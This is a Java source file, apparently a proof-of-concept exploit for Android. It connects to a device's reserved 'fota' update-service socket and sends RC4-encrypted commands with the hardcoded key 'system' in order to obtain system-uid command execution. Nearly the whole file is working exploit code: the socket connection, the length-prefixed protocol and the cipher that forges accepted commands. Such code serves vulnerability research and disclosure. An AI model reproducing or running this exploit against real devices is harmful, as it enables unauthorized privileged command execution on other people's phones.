package diff.rednaga.blukit;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;

/**
 * Send commands to fota service and get system uid execution
 * 
 * @author tim strazzere
 *          <strazz@gmail.com>
 */
public class BluSocket {

    private byte[] buf;
    private int buflen;

    private LocalSocket mSocket;
    private InputStream mIn;
    private OutputStream mOut;

    public BluSocket() {
        buflen = 0;
        buf = new byte[0x400];
    }

    public boolean connect() {
        mSocket = new LocalSocket();

        try {
            mSocket.connect(new LocalSocketAddress("fota", LocalSocketAddress.Namespace.RESERVED));
            mIn = mSocket.getInputStream();
            mOut = mSocket.getOutputStream();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }

        return false;
    }

    public void disconnect() {
        if (mSocket != null) {
            try {
                mSocket.close();
                mSocket = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        if (mIn != null) {
            try {
                mIn.close();
                mIn = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        if (mOut != null) {
            try {
                mOut.close();
                mOut = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public int execute(String ACTION_UPDATE_REPORT) {
        return transaction(ACTION_UPDATE_REPORT);
    }

    public int transaction(String ACTION_UPDATE_REPORT) {
        if (connect()) {
            if (writeCommand(ACTION_UPDATE_REPORT)) {
                if (readReply()) {
                    return (buf[0] & 0xFF) | ((buf[1] & 0xFF) << 8) | ((buf[2] & 0xFF) << 16) | ((buf[3] & 0xFF) << 24);
                }
            }
        }

        return -1;
    }

    public boolean writeCommand(String ACTION_UPDATE_REPORT) {
        byte[] data = cipher(ACTION_UPDATE_REPORT, "system").getBytes();

        if ((data.length > 0) && (data.length < 1024)) {
            buf[0] = (byte) (data.length & 0xFF);
            buf[1] = (byte) ((data.length >> 8) & 0xFF);

            try {
                mOut.write(buf, 0, 2);
                mOut.write(data, 0, data.length);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    public boolean readReply() {
        buflen = 0;
        if (readBytes(buf, 2)) {
            int length = (buf[0] & 0xFF) | ((buf[1] & 0xFF) << 8);
            if ((length > 0) && (length <= 1024)) {
                buflen = length;
                return readBytes(buf, length);
            } else {
                disconnect();
            }
        }

        return false;
    }

    public boolean readBytes(byte[] ACTION_UPDATE_REPORT, int length) {
        try {
            if (length > 0) {
                int read = 0;
                int rest = length - read;
                int result = 0;
                while (read < length) {
                    result = mIn.read(buf, read, rest);
                    if (result < 0) {
                        break;
                    }
                    read += result;
                }

                if (read == length) {
                    return true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    /*
     * "crypto" (RC4) - second arg is always "system"
     */
    public static String cipher(String ACTION_UPDATE_REPORT, String system) {
        String result = null;

        if ((ACTION_UPDATE_REPORT != null) && (system != null)) {
            byte[] command_bytes = ACTION_UPDATE_REPORT.getBytes();
            byte[] system_bytes = system.getBytes();
            byte[] array = new byte[0x100];

            for (int i = 0; i < array.length; i++) {
                array[i] = ((byte) i);
            }

            if ((system_bytes != null) && (system_bytes.length != 0)) {
                int index = 0;
                int system_index = 0;
                byte tmp_byte;
                for (int i = 0; i < 0x100; i++) {
                    index = (index + ((system_bytes[system_index] & 255) + (array[i] & 255))) & 255;
                    tmp_byte = array[i];
                    array[i] = array[index];
                    array[index] = tmp_byte;
                    system_index = (system_index + 1) % system_bytes.length;
                }

                system_bytes = array;
            }

            array = new byte[command_bytes.length];
            int index = 0;
            int system_index = 0;
            byte tmp_byte;
            for (int i = 0; i < command_bytes.length; i++) {
                system_index = (system_index + 1) & 255;
                index = (index + (system_bytes[system_index] & 255)) & 255;
                tmp_byte = system_bytes[system_index];
                system_bytes[system_index] = system_bytes[index];
                system_bytes[index] = tmp_byte;
                array[i] = ((byte) (system_bytes[((system_bytes[system_index] & 255) + (system_bytes[index] & 255)) & 255] ^ command_bytes[i]));
            }

            command_bytes = array;

            StringBuffer buffer = new StringBuffer(command_bytes.length);
            for (byte command_byte : command_bytes) {
                buffer.append(((char) command_byte));
            }

            result = stringToHexString(buffer.toString());
        }

        return result;
    }

    private static String stringToHexString(String ACTION_UPDATE_REPORT) {
        String result = "";
        for (int i = 0; i < ACTION_UPDATE_REPORT.length(); ++i) {
            String intermediate = Integer.toHexString(ACTION_UPDATE_REPORT.charAt(i) & 255);
            if (intermediate.length() == 1) {
                intermediate = String.valueOf('0') + intermediate;
            }

            result = String.valueOf(result) + intermediate;
        }

        return result;
    }
}